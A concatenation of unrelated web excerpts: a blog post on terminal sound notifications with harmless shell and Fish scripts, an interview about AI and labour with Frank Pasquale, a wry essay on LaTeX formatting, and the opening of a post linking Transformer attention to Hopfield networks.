</code></pre></div></div> <p>Pretty cool! So when I said that drawing is done as an XOR operation, the only way to remove a sprite from the screen is to draw over it (1 ⊕ 1 is 0). This is why you often see flickering in CHIP-8 programs, the sprite is continuously drawing and un-drawing to depict movement.</p> <p>Okay we’re just about ready to write a sprite drawing function. We’re going to need a starting point and a sprite (a chunk of memory). Since sprite height is variable, we’ll receive that parameter too. One thing that took me quite a long time to debug is that the CHIP-8 interperter supports drawing out of bounds. When that happens, the draw continues as it wraps around. This also works for the starting coordinates of the (so drawing at 255,255 for 15 rows is perfectly valid). Also, the interpreter needs to receive back whether or not a pixel was turned off (this is often used for collision detection).</p> <div><div><pre><code><span>// image.cpp</span>

December 8, 2020 | https://cgamesplay.com/post/2020/12/09/iterm-notifications/ | <a href="https://web.archive.org/web/*/https://cgamesplay.com/post/2020/12/09/iterm-notifications/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For some reason, I've found that in my career a lot of the work I do ends up involving slow REPL loops: I make a change, run a command, wait for it to finish, and repeat. While I'm sitting there waiting, it's easy to be distracted by things, and I want my task to bring itself back to my attention when it's ready. This desire has led me on a multi-year quest to tailor my notifications perfectly, and in this post I'm going to share what I've come up with.</p>
<p>Here are the features I want my notifications to have:</p>
<ul>
<li>I should be able to activate them from anywhere in the terminal: in bash, from the ruby console, over SSH, or anywhere else I find myself (in the terminal).</li>
<li>They should be subtle so they don't get too annoying, but noticeable enough that I don't miss them.</li>
<li>The should only fire when I want them: too many notifications will cause me to ignore all of them.</li>
</ul>
<h2>The early days</h2>
<p>Back in 2015 or so, my company was writing scrapers to extract detailed, structured information from hundreds of websites. Each website was different and since we needed the information to be structured, we had to write a different scraper for each one. A single site could be scraped in about 5 minutes, and the data only changed a few times each year. Still, the sites would change often enough that I frequently found myself sitting in the office until late at night, mostly waiting for these scrapers to break so I could make one small fix, and repeat. Five minutes for each change really adds up when you have to repeat the entire scraper to test a single-line change.</p>
<p>Fortunately, writing scrapers is pretty easy technically, so I didn't need to be 100% focused as I was working on them. That meant that while I was waiting on the latest change I'd made to a scraper, I was able to focus on other high-value activities like shooting for a high score in Peggle Nights.</p>
<p><img src="https://cgamesplay.com/media/20201201-1309-peggle-small.jpg" alt="Screenshot of Peggle Nights"></p>
<p>But sometimes, when I was planning a tough shot on a high-scoring round, I could forget that I was still at the office waiting for my scraper to crash so I could fix it. That's why I wanted a simple way to get notified when it was waiting for me. My first-ever attempt at building a notifications system used a feature built-in to Mac OS: the <code>say</code> command.</p>
<pre><code>long_running_command<span>;</span> say <span>"done"</span>
</code></pre>
<p>This command uses the system's text-to-speech to play through your computer speakers. The scrapers I was writing were mostly in Ruby, so if I were in IRB I could still get the notification:</p>
<pre><code>my_scraper<span>.</span>run_main <span>rescue</span> ex <span>=</span> $<span>!</span><span>;</span> `say done`
</code></pre>
<p>This will play the notification even if the scraper fails, and preserve the raised exception in the <code>ex</code> variable. Neat!</p>
<p>I used this solution for a few months, but I always felt that the text-to-speech was a little unpleasant. I decided to switch out the <code>say</code> command for the built-in audio file player, <code>afplay</code>, and I used one of the default sounds that comes with Mac OS.</p>
<pre><code><span>function</span> <span>ding</span> <span>{</span>
  afplay /System/Library/Sounds/Glass.aiff
<span>}</span>
long_running_command<span>;</span> ding
</code></pre>
<p>That makes this sound, which is a little more subtle than a robotic voice shouting at me.</p>
<p><audio controls="" src="https://cgamesplay.com/media/20201125-1600-iterm-sounds-glass.aiff"><a href="https://cgamesplay.com/media/20201125-1600-iterm-sounds-glass.aiff">Click to download</a></audio></p>
<p>These two tricks got me along just fine for years. I felt like I had solved the problem and didn't need to think about it any more. Well, except when I started a command that I thought would be fast but it instead took an hour to run. But I developed a trick for that: if you press <code>^Z</code> (Ctrl-Z) to pause the job, then you can use <code>fg; ding</code> to resume it  and ding when it finishes. There. Now it's perfect.</p>
<h2>Improving on perfection</h2>
<p>One day I learned about <a href="https://iterm2.com/documentation-shell-integration.html" target="_blank" rel="noopener">iTerm2 shell integration</a>. This provides a bunch of neat features, and one of them is about notifications! It's not very well documented, but if you use Edit ► Marks and Annotations ► Alerts ► Alert on Next Mark, or the much-easier-to-remember Option-Command-A, you'll get a native notification when the currently running command finishes. I installed the shell integration and to this day I use this feature more than anything else that it provides.</p>
<p>Fast forward to 2020 and I've changed roles again. This time, I find myself automating cloud server provisioners, and waiting for the machines to come up isn't fast. Sadly, the iTerm shell integration has to be installed on each server, and my perfect notification scripts don't work over SSH. Realizing that perfection is a journey and not a destination, I set out to improve my notifications once again. Except this time, I was going to go industrial-strength.</p>
<p>When I was learning about the iTerm2 shell integration, I also found out about <a href="https://cgamesplay.com/post/2020/11/25/iterm-plugins/">a bunch of other features that iTerm2 supports</a>. If you want to follow along with me, read over that post and install <code>PlaySound.py</code>, <code>iterm_notify</code>, <code>iterm_badge</code>, and <code>iterm_bounce</code> on your computer. These new features had already made my notifications more powerful and SSH-compatible, but I had set my sights beyond a simple "ding!" sound. I wanted a smart notification system that would "ding" when the command completed, but "bonk" when it failed. But first I needed to find the right sounds to use.</p>
<p><img src="https://cgamesplay.com/media/20201201-1344-oot-navi.jpg" alt="The Legend of Zelda: Ocarina of Time"></p>
<p>The first sound that came to mind was the iconic "Hey! Listen!" from Ocarina of Time. If you played this game, then you probably know exactly how that sounds. I found a gallery of <a href="http://noproblo.dayjo.org/ZeldaSounds/" target="_blank" rel="noopener">sounds from the Zelda games</a> and searched for some appropriate ones. Eventually I settled on these two, for my "good" and "bad" sounds:</p>
<p><audio controls="" src="https://cgamesplay.com/media/20201201-1347-ootpressstart.wav"><a href="https://cgamesplay.com/media/20201201-1347-ootpressstart.wav">Click to download</a></audio></p>
<p><audio controls="" src="https://cgamesplay.com/media/20201201-1349-mmtatlalarm.wav"><a href="https://cgamesplay.com/media/20201201-1349-mmtatlalarm.wav">Click to download</a></audio></p>
<p>The first thing to do is wrap them up in scripts to make them easy to use. I put them in my sound library (which is listing in <a href="https://github.com/CGamesPlay/dotfiles/blob/bee7d071a7b85f7becc696edc0b328677eb16c40/macos/Library/Application%20Support/iTerm2/Scripts/AutoLaunch/PlaySound.py" target="_blank" rel="noopener">PlaySound.py</a>) and wrote these:</p>
<pre><code><span>function</span> <span>ding</span> <span>{</span>
    iterm_sound OOT_PressStart
<span>}</span>

<span>function</span> <span>bonk</span> <span>{</span>
    iterm_sound MM_Tatl_Alarm.wav
<span>}</span>
</code></pre>
<p>Now I can run my provisioning script like this:</p>
<pre><code>./provision.sh <span>&amp;&amp;</span> ding <span>||</span> bonk
</code></pre>
<p>If the script succeeds, the <code>&amp;&amp; ding</code> will run, resulting in a pleasant chime. Otherwise the <code>|| bonk</code> sound will run and I'll hear a nervous fairy. But I can do better! This is too much to type, and I want to leverage all of my notification channels, not just sound. So I wrote this function:</p>
<pre><code><span>function</span> <span>sound_status</span> <span>{</span>
    <span>local</span> <span>last_status</span><span>=</span><span>$?</span>
    <span>test</span> <span>$last_status</span> -eq <span>0</span> <span>&amp;&amp;</span> ding <span>||</span> bonk
    iterm_bounce
    <span>if</span> <span>test</span> -z <span>"<span>$@</span>"</span><span>;</span> <span>then</span>
        iterm_notify <span>"Command finished with status <span>$last_status</span>"</span>
    <span>else</span>
        iterm_notify <span>"<span>$@</span> finished with status <span>$last_status</span>"</span>
    <span>fi</span>
    <span>return</span> <span>$last_status</span>
<span>}</span>
</code></pre>
<p>This function has 3 important qualities:</p>
<ol>
<li>It automatically chooses the sound to play.</li>
<li>It also shows a system notification, with an optional custom message.</li>
<li>It passes on the exit code, so you can run it in a pipeline.</li>
</ol>
<p>For example, I can use it like this:</p>
<pre><code>./provision.sh<span>;</span> sound_status <span>"provision.sh"</span> <span>&amp;&amp;</span> <span>ssh</span> myhost
</code></pre>
<p>Because it passes on the exit status, the <code>&amp;&amp; ssh</code> will only happen when the command succeeds, just like if the <code>; sound_status</code> hadn't been there at all.</p>
<h2>The little things in life</h2>
<p>This notification script feels great: simple, only when requested, and with just a bit of "fun" flavor. But there is another area where I think that a subtle audio cue would help streamline my workflow. Sometimes I need to type 3 or 4 quick commands back-to-back. Has this ever happened to you?</p>
<pre><code>$ <span>git</span> commit -m <span>"respond to feedback"</span>
no changes added to commit <span>(</span>use <span>"git add"</span> and/or <span>"git commit -a"</span><span>)</span>
$ <span>git</span> push
Everything up-to-date
</code></pre>
<p>I run these commands, see that it succeeded, shut my laptop, and head out to lunch. Later that day I wonder why nobody has reviewed my code, only to find that the second command had failed because I never staged those files, so I never pushed any changes at all. If I had been more careful, this wouldn't have happened. As a substitute for being more careful, I can have the computer tell me when my commands fail!</p>
<p>When I want is a subtle ping to tell me that something bad happened, every time a command fails. A lot of times this notification will be unnecessary. For example, if  <code>make</code> fails with a compile error, I don't really need a sound to tell me about that. So I wanted a "negative" sound that wasn't too distracting. I eventually settled on this one.</p>
<p><audio controls="" src="https://cgamesplay.com/media/20201201-1409-alert-destroyed.wav"><a href="https://cgamesplay.com/media/20201201-1409-alert-destroyed.wav">Click to download</a></audio></p>
<p>Can you recognize it? It's a sound you'll have heard pretty often if you've ever played Factorio: the notification that a building you own has been destroyed. In the game, you'll often hear this sound altering you of an attack while you're working on some other task. Generally, it indicates a problem, but not necessarily an urgent one. I thought it would be perfect. Since I'm a user of <a href="https://fishshell.com/" target="_blank" rel="noopener">Fish shell</a>, I rigged up the notification like this:</p>
<pre><code>
<span>if</span> <span>test</span> -z <span>$beep_command</span>
  <span>set</span> beep_command <span>"printf <span title="\a">\a</span>"</span>
end
<span>set</span> beep_primed <span>""</span>
<span>function</span> beep_preexec --on-event fish_preexec
  <span>set</span> -g beep_primed <span>1</span>
end
<span>function</span> beep_postexec --on-event fish_postexec
  <span>set</span> -l last_status <span>$status</span>
  <span>if</span> <span>test</span> <span>!</span> -z <span>$beep_primed</span> -a <span>!</span> -z <span>$argv</span><span>[</span><span>1</span><span>]</span> -a <span>$last_status</span> -ne <span>0</span>
    <span>eval</span> <span>$beep_command</span>
  end
  <span>set</span> -g beep_primed <span>""</span>
end
</code></pre>
<p>There's a few things worth mentioning here:</p>
<ul>
<li>To set the beep command, I used <code>set -U beep_command "iterm_sound Factorio/alert-destroyed.wav"</code>. This sets a "<a href="https://fishshell.com/docs/current/#variable-scope" target="_blank" rel="noopener">universal variable</a>" in fish, so it's permanent and system-wide. This lets me change the sound easily whenever I want.</li>
<li>The <code>fish_postexec</code> command runs even if you didn't run a command (pressed enter at an empty prompt), so we use the <code>-z $argv[1]</code> to filter that out.</li>
<li>The <code>beep_primed</code> variable is needed to ensure that the sound only happens once when the command fails. This is necessary to avoid some awkward situations that come up when you press Ctrl-C to cancel a command.</li>
</ul>
<p>So that's where I am today. I am very happy with how my notifications work and I'm glad I was able to add a unique bit of flavor to them by sampling from some nostalgic video games. Thanks for reading! If you want to set up something like this and are having problems, feel free to <a href="https://cgamesplay.com/contact">reach out to me</a>.</p></div></div>]]>

<p><em>In this post, Sandeep Vaheesan interviews Frank Pasquale about his forthcoming book,&nbsp;<a href="https://www.hup.harvard.edu/catalog.php?isbn=9780674975224">New Laws of Robotics: Defending Human Expertise in the Age of AI</a>.</em></p>



<p><strong>Sandeep Vaheesan:</strong> Your book is powerful, deep, and a pleasure to read. It will be a major contribution to raging debates over democracy, the power of the tech sector, and what constitutes utopia (or dystopia). The book strikes at trans-ideological myths that have driven the discourse and shaped policy for the past few decades. What is the genesis of this work?</p>



<p><strong>Frank Pasquale:</strong> Thanks very much for those kind words, Sandeep. I appreciate your focus on myths, because one of the main purposes of a book like this is to vindicate some common sense about the value of labor, in the face of elaborately mathematicised economics that has lost sight of the purpose of economic growth.</p>



<p>My central argument is that AI and robotics most often complement, rather than replace, human labor, and that in many areas, we should maintain this status quo. Our technology policy should ensure that AI increases wages for most workers, rather than supplanting them.</p>



<blockquote><p>My central argument is that AI and robotics most often complement, rather than replace, human labor, and that in many areas, we should maintain this status quo. Our technology policy should ensure that AI increases wages for most workers, rather than supplanting them.</p></blockquote>



<p>Those goals are not terribly controversial—governments and political parties around the world claim to advance them. What politicians have ever said they want to cut jobs? But they do tend to favor capital over labor, and stock markets love layoffs. Rentiers can invest in politicians just as they do in stocks and bonds. And when they do so, a key concern is short-term profits, rather than longer-term investment in a more sustainable and inclusive economy.</p>



<p>However, this isn’t just a problem of corruption and improper influence. The economics of automation needs an overhaul. The leading figures in the field rarely make normative judgments about what the economy ought to accomplish or provide. They are so caught up in abstractions, they can’t grapple with the climate or COVID or inequality catastrophes in front of their faces.</p>



<p>I recall hearing one economist talking about how persons that make under $24 an hour are very likely to be replaced by robots, and those making above $48 an hour are very unlikely to be automated out of their jobs. The lesson, according to President Obama’s Chair of Economic Advisors, was that <a href="https://robotonomics.wordpress.com/2016/07/12/whitehouse-chairman-of-economic-advisors-why-we-need-more-artificial-intelligence/">education and job training</a> are key. I don’t disagree on that—<em>New Laws of Robotics </em>promotes both universal college education and targeted training opportunities. But I go much further. I don’t presume that all the well-paid jobs are all that socially useful. Rather, I propose ways to channel investment in AI and robotics toward human services that actually meet important needs, and away from a broad class of tech devoted to ranking, rating, sorting, and punishing people. I think that much of that AI—ranging from police robots to credit scores based on social media profiles to affective computing–is vastly overrated and creepy. (To paraphrase Ryan Calo: there are problems both if it fails to work, and if it works too well!) &nbsp;So <em>New Laws of Robotics </em>enthusiastically embraces the industrial policy that mainstream economics primly sidesteps to maintain a façade of neutrality.</p>



<p><strong>Sandeep Vaheesan: </strong>An important theme of your book is that technology is not an autonomous force. Too often, technology is presented as existing apart from society and periodically shaking up, or “disrupting,” supposedly problematic arrangements—think of the earlier narrative on Uber and the traditional cab industry. You do an excellent job discrediting this view and explaining that the direction and the pace of technological change are a product of human decision-making. How do you see technological change happening at present and what would a more democratic model be?</p>



<p><strong>Frank Pasquale: </strong>At present, the money goes where the perceived market is. So at the margin, if a VC has to decide on whether to invest in AI that, say, improves radiological exams (possibly catching cancer or other abnormalities earlier), or AI that boosts “employee engagement” by tracking eye movements—well, it depends on what can bring in massive profits faster. And there are some structural features that make health care the worse bet. Privacy laws are stricter in health care, so it may be harder to get the data. For a long time, health care providers have been pretty fragmented, so the radiology AI salesperson might need to visit hundreds of different offices to get buy-in. The technology needs to be validated, often with rigorous testing. And most importantly, insurers (both public and private) may not want to pay for the new technology, and thus may make it difficult for conscientious, forward-thinking radiologists to implement it well. In much of the private sector, the exact opposite is the case: there is no insurer judging the transaction, concentration is rampant, validation is an afterthought, and privacy laws are both weaker than HIPAA and less well-enforced.</p>



<p>Now, one vision for accelerating AI in health care is to get rid of features I just mentioned: suspend HIPAA and human subjects research protections, while vertically integrating care teams into massive corporations (perhaps run by <a href="https://www.cnbc.com/2019/03/06/amazon-jp-morgan-berkshire-hathaway-health-care-venture-named-haven.html">billionaires</a>). Maybe an Amazon hospital network can hire Amazon doctors, while an Amazon-Uber partnership takes over ambulance service and an Amazon pharmacy negotiates to reduce drug prices. Advances in AI could be tucked into that behemoth. Top managers in Seattle could gather data across hundreds of institutions, ranking and rating physicians based on patient outcomes. To the extent the Trump Administration has an AI policy, it’s that: shovel more money and power to the biggest American tech firms so they can keep up surveillance capitalism and merger sprees.</p>



<p>My book goes in a very different direction. I’d give professionals like doctors and nurses more autonomy to build a better health care system, while crafting incentives for them to take on more governance and research roles. I’d also encourage the professionalization of work that is now undervalued, like home health care. Would you rather see your parents or grandparents “cared for” by a robot (even cute ones, like the <a href="http://www.parorobots.com/">Paro</a> robotic seal, or <a href="https://www.theguardian.com/technology/2015/feb/27/robear-bear-shaped-nursing-care-robot">RoBear</a>), or would you rather such technology be introduced to them by caring and well-trained professionals, who can spark conversations about the robot?</p>

<p><strong>Sandeep Vaheesan</strong>: Your case for professionalism departs from the bipartisan consensus of our times. Centrists and libertarians alike have condemned professions as “anticompetitive guilds” and called for weakening their power. While this may have a kernel of truth for law, medicine, and other fields in which professionals can earn substantial incomes, the critique has been leveled against florists, hair stylists, and others who typically do not make six figures. What are the economic and political arguments for not only maintaining but expanding professionalism in American society? What are some advantages of professional market governance relative to corporate market governance?</p>



<p><strong>Frank Pasquale</strong>: One reason I wrote the book was a sense that professionals were getting a bad rap from all sides: left, right, and centrist. The right abhors worker interference in “labor markets,” while promoting capital’s autonomy to maximize its own <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3337861">coordination power</a>. The more anarchist strands of the left challenge epistemic authority as a mere assertion of power. And attacks on occupational licensing are catnip for centrists, who can convene left and right to erode the hard-won rights of professionals in order to “level the playing for labor”—downward, of course.</p>



<p>For this book, I kept asking: what would it look like to level the labor playing field up? How could a nurse enjoy something like the <a href="https://twitter.com/brian_callaci/status/1300228791743193090">security of position</a> that professors have? How could professors take a larger role in governing their universities, in the way nurses’ unions have successfully done in many areas? What would it look like for workers in logistics, cleaning, agriculture, and mining to unionize and professionalize, demanding a greater say in how technology was adopted in their fields?</p>



<p>If you take any of these questions individually, they may smack of unjustifiable privilege. And if a teacher were to simply say “please don’t develop educational AI so I can keep earning a salary,” that’s not a good argument for stopping it (just as horse-and-buggy drivers should not have been allowed to stop the development of cars).</p>



<p>However, as I explain in detail in my chapter on education, there is much more that teachers can say to justify their role. No robot or AI is anywhere near the competence of the median teacher. Even if they do advance in important ways, I still foresee teachers standing between students and educational AI the way a doctor stands between patients and prescription drugs. Teachers both help produce, and gather, data on which educational AI (such as chatbot teaching assistants) depends. TeachersSandeep Vaheesan interviews Frank Pasquale about his forthcoming book, New Laws of Robotics: Defending Human Expertise in the Age of AI. actually know students personally, while a distant “edtech vendor” may see them simply as revenue streams. If a test is badly graded by an AI, a teacher can stand as an immediately accessible “person-in-the-loop,” to review it. That is distributed, in-person, democratized expertise—something that dominant, autocratic corporate forms cannot replicate.</p>

Here's a quote from the paper "Document Production: Visual or Logical?"
in Notices of the American Mathematical Society (June 1987), pages 621-624,
by LaTeX author Leslie Lamport:
<blockquote>
The purpose of writing is to convey ideas to the reader.
The worst aspect of visual systems
is that they subvert the process of communicating ideas
by encouraging the writer to concentrate on form rather than content.
Ideas are conveyed by the logical structure of the text;
the function of the visual format is to display this structure.
The author should be concerned with the structure,
not any particular visual representation.
</blockquote>
Here's another quote:
<blockquote>
Document design is a skill acquired through training and experience.
A logical system can apply the skill of a trained designer
to the formatting of a document.
</blockquote>
<p>
Let's see how well this worked for one of my papers,
a paper that was forced to switch visual formats.

Originally I had used the American Mathematical Society's "amsart" format:

But then I found out that the book containing my paper
would use the "msripub" format
designed by MSRI book editor Silvio Levy.
Here's what happens when the same document is formatted
with "msripub" rather than "amsart":

Wow, that's a really pleasant document to read!
I love the huge chunks of white space,
the visually stunning bibliography,
the completely non-functional citations to that bibliography,
the entertaining little black boxes everywhere,
and the line on page 24 sticking not merely into the margin but beyond the printed area of the page.
I'm glad that I concerned myself solely with the structure of my document,
and not with any particular visual representation.
</p><p>
This document must have been first seen by Levy,
who was not merely the skilled "msripub" designer
but also the editor of this particular book.
Surely he was inspired by the document's near-perfect beauty
and thought that a few additional tweaks
would produce a truly stunning work of art.
The scientific editors of the book waited for Levy to act.
But Levy did nothing.
Perhaps the explanation lies in Lamport's wise words:
</p><blockquote>
A logical system forces the writer
to think in terms of the document's logical structure;
it doesn't give him the illusion
that he is accomplishing anything with cosmetic formatting changes.
</blockquote>
<p>
In any event,
I wasn't able to see the "msripub" version of the document until April 2007.
Levy never sent me a copy.
You might think that I could simply change "amsart" to "msripub"
in my own copy of the document,
but "msripub" is a proprietary format:
Levy keeps it to himself.
Eventually the scientific editors convinced Levy to send "msripub" to me.
I fed my document through "msripub" and admired the output.
</p><p>
Beautiful!
</p><p>
I returned to Lamport's article
and discovered that he allowed certain minor exceptions to his "illusion":
</p><blockquote>
Achieving the highest possible quality
requires the ability to make changes to the system's output.
This will be a matter of fine tuning,
changing such things as page breaks and figure placement. ...
[However:]
The changes will generally be of such a minor nature
that they are not worth bothering with
in a preliminary version intended for a small audience,
nor for any document that is not widely distributed.
...
I usually spend less than two minutes per page
doing the final formatting to produce camera-ready output.
This is insignificant compared with the two to eight hours per page I spend writing.
</blockquote>
"Highest possible quality" sounds desirable,
and "two minutes" sounds tolerably small,
so I decided to edit the "msripub" version of my document.
<p>
You might like to pause at this point to contemplate the goals of scientific publication.
Isn't it wonderful to see science propelled forward
by something as small and simple as the switch from "amsart" to "msripub"?
</p><p>
Back to the story.
After many, many, many hours of work I had a new version of the document:

I had changed more than 100 separate lines of the main text,
not to mention the introductory figures, the bibliography, etc.
Many of those lines were quite difficult to adjust:
eliminating one bad line break
often meant experimenting with several different wordings and inspecting the output of each.
"Two minutes" is, I regret to report, a rather severe underestimate.
Could it be that Levy had a different reason for doing nothing at all with this paper?
</p><p>
I spent a few more hours carefully checking the paper
against the old "amsart" version
to see whether any bugs had been introduced by this flood of changes.
I ended up fixing two obsolete cross-references and two typos.
And so, finally, the conversion from "amsart" to "msripub" came to an end.

<p>In 2017, <a href="https://arxiv.org/abs/1706.03762" target="_blank" rel="noopener">Attention Is All You Need</a> <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> demonstrated state-of-the-art performance in neural machine translation by stacking only (self-)attention layers. Compared to recurrent neural networks, Transformer models exhibit efficient parallel processing of tokens, leading to better modeling of long-range correlations and, most importantly, <a href="https://arxiv.org/abs/2001.08361" target="_blank" rel="noopener">favorable scaling in terms of data and compute</a>. Since then, Transformers seem to have taken over natural language processing. Widespread adoption of attention-based architectures seems likely given recent work like <a href="https://arxiv.org/abs/2010.11929" target="_blank" rel="noopener">An Image is Worth 16x16 Words: Transformers for Image Recognition at Scale</a> and the flurry of developments addressing the architecture’s quadratic scaling bottlenecks.</p>
<p>Recently, the papers <a href="https://arxiv.org/abs/2008.02217" target="_blank" rel="noopener">Hopfield Networks is All You Need</a> <sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> <sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> <sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> and <a href="https://arxiv.org/abs/2008.06996" target="_blank" rel="noopener">Large Associative Memory Problem in Neurobiology and Machine Learning</a> <sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> provided complementary post-facto explanations of some of the success of Transformers from the perspective of energy-based models. In this post, I provide a biased overview of (self-)attention in Transformers and summarize its connections to modern Hopfield networks. Along the way, I look for intuition from physics and indulge in hand-wavy arguments on how an energy-based perspective can shed light on training and improving Transformer models.</p>

<p>Let’s start off with an overview of the components in a vanilla Transformer model. Since our focus is on (self-)attention, I am going to assume some prior knowledge<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup> and skip comprehensive architecture descriptions and experimental results. In <a href="#3-from-hopfield-networks-to-transformers">Section 3</a>, we will start from scratch and use Hopfield networks to build back up to the attention module described below.</p>
<h2 id="vanilla-transformers">Vanilla Transformers</h2>
<p>The proto-Transformer was introduced in an encoder-decoder context for machine translation in <a href="https://arxiv.org/abs/1706.03762" target="_blank" rel="noopener">Attention Is All You Need</a>. The original motivation seems to have been mostly driven by engineering efforts to model long-range correlations in sequence data and the recent successes of attention mechanisms stacked on top of recurrent neural networks. The main contribution and selling point of the paper was making an attention-only approach to sequence modeling work.</p>
<p><img src="https://mcbal.github.io/post/an-energy-based-perspective-on-attention-mechanisms-in-transformers/vanilla_transformer.png" alt="alt text" title="Vanilla Transformers encoder-decoder architecture"></p>
<p>Let’s focus on the encoder on the left and ignore the decoder on the right. Transformer models accept (batches of) sets of vectors, which covers most inputs people care about in machine learning. Text can be modelled as a sequence of embedded tokens. Images can be viewed as a snaky sequence of embedded pixels or embedded patches of pixels. Since sets have no notion of ordering, learned or fixed positional information needs to be explicitly added to the input vectors.</p>
<p>The main module in the Transformer encoder block is the multi-head <em>self-attention</em>, which is based on a (scaled) dot-product attention mechanism acting on a set of $d$-dimensional vectors:</p>
<p>\begin{equation}
\mathrm{Attention}\left( \mathbf{Q}, \mathbf{K}, \mathbf{V} \right) = \mathrm{softmax} \left( \frac{\mathbf{Q} \mathbf{K}^T}{\sqrt{d}} \right) \mathbf{V}
\label{eq:vanilla-attention}
\end{equation}</p>
<p>Here, queries $\mathbf{Q}$, keys $\mathbf{K}$, and values $\mathbf{V}$ are matrices obtained from acting with different linear transformations — parametrized respectively by weights $\mathbf{W}_{\mathbf{Q}}$, $\mathbf{W}_{\mathbf{K}}$, and $\mathbf{W}_{\mathbf{V}}$ — on the same set of $d$-dimensional inputs. <em>Cross-attention</em> takes the inputs for its queries from a different source than for its keys and values, as can be glimpsed from the decoder part of the architecture on the right.</p>
<p>For every input query, the updated output query of \eqref{eq:vanilla-attention} is a linear combination of values weighted by an attention matrix quantifying the overlap of the input query with the keys corresponding to these values. Since all objects are vectors and the attention mechanism is just a dot product between vectors, we can think of the attention module as matching query vectors to their “closest” key vectors in latent space and summing up contributions from value vectors, weighted by the “closeness” of their keys to the queries.</p>
<p>The remaining components of the Transformer encoder block are needed to make the module work properly in practice:</p>
<ul>
<li>The <em>multi-headedness</em> of the attention module refers to chunking up the dimension of the vector space and having multiple attention operations running in parallel in the same module, yet with each acting on a lower-dimensional segment of the full space. This is a trick to (1) get around the fact that every input vector only couples to one query at a time to calculate its attention coefficient, and (2) provide multiple starting points in the subspaces for the queries, which might help to avoid bad local minima in parameter space during optimization.</li>
<li>A positional feed-forward network, made up of two linear layers with a non-linearity in between, is inserted at the end of the module. Folklore wisdom tells us that the feed-forward layer needs to blow up the dimension of the latent space by a factor of four for it to be able to “disentangle” the represention. More likely though, it’s a way to increase model capacity and warp latent spaces since the attention modules on their own are pretty much linear apart from the $\mathrm{softmax}$-operator used to obtain the normalized attention coefficients.</li>
<li>Residual connections are added to control the flow of gradients.</li>
<li>Layer normalisation is used to control learning dynamics and keep vector norms from exploding.</li>
</ul>
<h2 id="beyond-vanilla-confronting-quadratic-scaling">Beyond vanilla: confronting quadratic scaling</h2>
<p>Most architectural variations of the vanilla Transformer are targeted at the attention module, which scales poorly with respect to the input sequence length $N$. Since the overlap of all queries with all keys is required, calculating a dense attention matrix scales like $\mathcal{O}(N^2)$ in time and space. Limits on the context window of the attention mechanism during training prevent the model from learning how to deal with long sequences and long-range correlations. The majority of post-vanilla Transformer species can be classified into one of the following buckets<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup>:</p>
<ul>
<li>Low-rank approximations: truncate the matrix product $\mathbf{Q} \mathbf{K}^T$ since it’s likely not full rank for structured data</li>
<li>Sparsification: reduce the attention calculation from all query-key pairs to a subset because not all of them feel the need to talk to each other</li>
<li>Recurrence: keep track of a (compressed) history of context</li>
<li>Kernels: approximate the attention operation with kernel methods</li>
</ul>
<p>For the remainder of our discussion, we will focus on vanilla Transformers. One of the goals of this blog post is to explore how a different perspective on the <em>function</em> of attention-based algorithms might lead to qualitatively different improvements beyond what is possible by relying on scaling and reducing computational complexity alone.</p>

<p>In this section, we provide a short history of Hopfield networks and gradually build up intuition until we can recognize the Transformer self-attention mechanism for what it really is. We refer to the <a href="https://ml-jku.github.io/hopfield-layers/" target="_blank" rel="noopener">blog post</a> accompanying <a href="https://arxiv.org/abs/2008.02217" target="_blank" rel="noopener">Hopfield Networks is All You Need</a> for more details and insightful visualizations of pattern storage and retrieval.</p>
<h2 id="classical-discrete-hopfield-networks">Classical discrete Hopfield networks</h2>
<p>A <a href="https://en.wikipedia.org/wiki/Hopfield_network" target="_blank" rel="noopener">Hopfield network</a> is a simple model for associative memory popularized by John Hopfield in his 1982 paper <a href="https://www.pnas.org/content/pnas/79/8/2554.full.pdf" target="_blank" rel="noopener">Neural Networks and Physical Systems with Emergent Collective Computational Abilities</a><sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup>. The task of an associative memory is to store and retrieve patterns, preferably in a way that allows one to recover stored patterns quickly with a low error rate.</p>
<p>The basic idea of the Hopfield network — and other energy-based models like <a href="https://en.wikipedia.org/wiki/Boltzmann_machine" target="_blank" rel="noopener">Boltzmann machines</a> — is to construct an <em>energy function</em> which defines an <em>energy landscape</em> containing basins of attraction around patterns we want to store. Starting at any pattern, we want to have an update rule pointing towards the closest stored pattern, guided by a scalar “closeness” score provided by the energy function.</p>
<p><a href="https://en.wikipedia.org/wiki/Hopfield_network" target="_blank" rel="noopener"><img src="https://mcbal.github.io/post/an-energy-based-perspective-on-attention-mechanisms-in-transformers/energy_landscape.png" alt="alt text" title="Toy energy landscape of a Hopfield Network"></a></p>
<p>Let’s make this a bit more formal but not too formal. Consider trying to store a set of $N$ binary patterns $\{\boldsymbol{x}_{i}\}_{i=1}^{N}$ where each pattern $\boldsymbol{x}_{i}$ is a $d$-dimensional vector whose entries are either $-1$ or $1$. For example, in the case of storing black-and-white images, every image would correspond to a string of pixel values, a binary pattern $\boldsymbol{x}_{i}$.</p>
<p>For any query $\boldsymbol{\xi} \in \mathbb{R}^{d}$, or <em>state pattern</em>, we want to find a way to retrieve the closest <em>stored pattern</em>. In his paper, Hopfield considered the energy function</p>
<p>\begin{equation}
E = - \frac{1}{2} \boldsymbol{\xi}^{T} \boldsymbol{W} \boldsymbol{\xi} + \boldsymbol{\xi}^{T} \boldsymbol{b} = - \frac{1}{2} \sum_{i=1}^{d} \sum_{j=1}^{d} w_{ij} \xi_{i} \xi_{j} + \sum_{i=1}^{d} b_{i} \xi_{i} ,
\label{eq:ising}
\end{equation}</p>
<p>where $\boldsymbol{b} \in \mathbb{R}^{d}$ denotes a bias vector and the weights $\boldsymbol{W} \in \mathbb{R}^{d \times d}$ are set to the sum of the outer products of the patterns we want to store</p>
<p>\begin{equation}
\boldsymbol{W} = \sum_{i=1}^{N} \boldsymbol{x}_{i} \otimes …</p></div></div>

<h2>2. <strong>You can learn about your clients.</strong></h2>



